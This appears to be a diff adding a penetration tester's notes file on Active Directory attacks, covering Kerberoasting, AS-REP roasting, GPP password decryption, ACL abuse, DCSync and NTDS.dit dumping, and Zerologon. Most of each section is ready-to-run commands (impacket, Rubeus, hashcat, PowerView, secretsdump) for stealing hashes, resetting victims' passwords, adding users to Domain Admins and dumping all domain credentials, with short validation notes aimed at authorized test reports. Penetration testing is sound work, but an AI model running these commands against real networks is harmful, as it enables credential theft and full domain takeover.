@@ -1,0 +1,186 @@
+Active Directory Attacks
+
+
+# Overview
+
+Credential theft, Kerberos abuse, ACL exploitation, and domain credential dumping after recon and BloodHound analysis.
+
+
+# Related Notes
+
+active-directory.txt     Domain recon and enumeration
+ad-bloodhound.txt        SharpHound and path analysis
+ldap-owa.txt             Password spraying
+passwords.txt            Offline hash cracking
+windows-credentials.txt  LSASS dumping on member hosts
+windows-lateral.txt      Pass-the-hash after hash extraction
+
+
+# Kerberos
+
+## Overview
+
+Kerberos is the default AD authentication mechanism. Tickets (TGT, TGS) grant access to services. Abuse targets service account hashes, AS-REP roastable users, and forged tickets when krbtgt or service keys are compromised.
+
+Key terms:
+    KDC / krbtgt       Ticket Granting Service account
+    TGT                Ticket Granting Ticket
+    TGS                Service ticket
+    SPN                Service Principal Name tied to a service account
+
+Golden ticket: forged TGT using krbtgt NTLM hash — domain persistence.
+Silver ticket: forged TGS for a specific service using that service account hash.
+
+## Validation / False Positives
+
+Kerberos errors (KDC_ERR_PREAUTH_REQUIRED, clock skew) are not vulnerabilities — fix time sync and retry with valid technique.
+
+
+# Kerberoasting
+
+## Overview
+
+Request TGS tickets for SPN accounts and crack service account passwords offline.
+
+## Commands
+
+Linux:
+    impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <DC IP> -request -outputfile kerberoast.txt
+    crackmapexec ldap <DC IP> -u <user> -p <password> --kerberoasting kerberoast.txt
+
+Windows:
+    Rubeus.exe kerberoast /outfile:kerberoast.txt
+    setspn -T <domain> -Q */*
+
+Crack:
+    hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
+
+## Validation / False Positives
+
+Confirm the SPN account is enabled and the hash cracks to a useful password before reporting.
+Machine account SPNs are usually not worth roasting — focus on user SPNs.
+
+
+# AS-REP Roasting
+
+## Overview
+
+Users without Kerberos pre-authentication expose crackable AS-REP hashes.
+
+## Commands
+
+impacket-GetNPUsers <domain>/ -usersfile users.txt -no-pass -dc-ip <DC IP> -format hashcat -outputfile asrep.txt
+Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
+
+hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
+
+## Validation / False Positives
+
+BloodHound "AS-REP Roastable" still requires a successful hash retrieval — confirm with GetNPUsers output.
+
+
+# Group Policy Preferences Passwords
+
+## Overview
+
+Legacy GPP may store AES-encrypted passwords in SYSVOL XML files.
+
+## Commands
+
+PowerSploit:
+    powershell.exe -nop -exec bypass
+    Import-Module PowerSploit.ps1
+    Get-GPPPassword
+
+Manual:
+    \\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\
+    Search xml files for cpassword
+    gpp-decrypt '<AES 256-bit encrypted password>'
+
+## Validation / False Positives
+
+Microsoft patched new GPP password storage in MS14-025 — old xml files may still exist.
+Decrypted password must work on a live account to be reportable.
+
+
+# ACL Abuse
+
+## Overview
+
+Dangerous ACEs on users, groups, computers, or OUs enable password changes, membership adds, or full object control.
+
+## Payloads / Techniques
+
+GenericAll on a user: change password without knowing the old one
+WriteDacl: grant yourself rights on the object
+ForceChangePassword: reset victim password
+AddMember: add yourself to a group
+
+## Commands
+
+PowerView:
+    Find-InterestingDomainAcl -ResolveGUIDs
+    Get-ObjectAcl -SamAccountName <victim> -ResolveGUIDs
+    Set-DomainUserPassword -Identity <victim> -Password (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
+    Add-DomainGroupMember -Identity "Domain Admins" -Members <your user>
+
+Linux:
+    bloodyAD -u <user> -p <password> -d <domain> set password <victim> 'NewPass123!'
+    net rpc password <victim> 'NewPass123!' -U "<domain>/<user>%<password>" -S <DC IP>
+
+## Validation / False Positives
+
+BloodHound GenericAll edges require confirming the ACE applies to your current principal.
+Changing a password on a disabled or honeypot account is not useful — verify account status.
+
+
+# DCSync and NTDS Dumping
+
+## Overview
+
+Extract domain password hashes by replicating the NTDS.dit database. Requires Replicating Directory Changes rights (e.g. Domain Admins, Enterprise Admins, or delegated DCSync).
+
+## Commands
+
+DCSync (preferred):
+    impacket-secretsdump <domain>/<user>:<password>@<DC IP> -just-dc
+    impacket-secretsdump <domain>/<user>@<DC IP> -hashes :<NTLM hash> -just-dc
+    impacket-secretsdump -just-dc-user krbtgt <domain>/<user>:<password>@<DC IP>
+    crackmapexec smb <DC IP> -u <user> -p <password> --ntds
+
+Volume shadow / local copy:
+    msf > use auxiliary/admin/smb/psexec_ntdsgrab
+    impacket-secretsdump -system SYSTEM -ntds NTDS.dit LOCAL
+
+On-DC (requires DA on DC):
+    Invoke-NinjaCopy -Path C:\Windows\NTDS\ntds.dit -LocalDestination C:\ntds.dit -ComputerName <DC hostname>
+
+## Validation / False Positives
+
+secretsdump ACCESS_DENIED means insufficient replication rights — not a false positive on the technique.
+Confirm krbtgt or user hashes parse correctly before reporting full domain compromise.
+
+
+# Zerologon (CVE-2020-1472)
+
+## Overview
+
+Legacy Netlogon cryptographic flaw against unpatched domain controllers. Most production DCs are patched — use only when patch level is unknown or in lab environments.
+
+## Commands
+
+apt install python3-venv
+python3 -m venv zerologon-venv
+source zerologon-venv/bin/activate
+pip install git+https://github.com/fortra/impacket.git
+git clone https://github.com/SecuraBV/CVE-2020-1472.git scanner
+cd scanner && pip install -r requirements.txt
+./zerologon_tester.py <dc-hostname> <dc-ip>
+
+# If vulnerable, use a public exploit repo with authorization, then:
+secretsdump.py -no-pass -just-dc <domain>/<dc-hostname>\$@<dc-ip>
+
+## Validation / False Positives
+
+zerologon_tester VULNERABLE requires patch verification on the DC — patched systems return safe status.
+Reset machine account password carefully — improper exploitation can break DC secure channel.
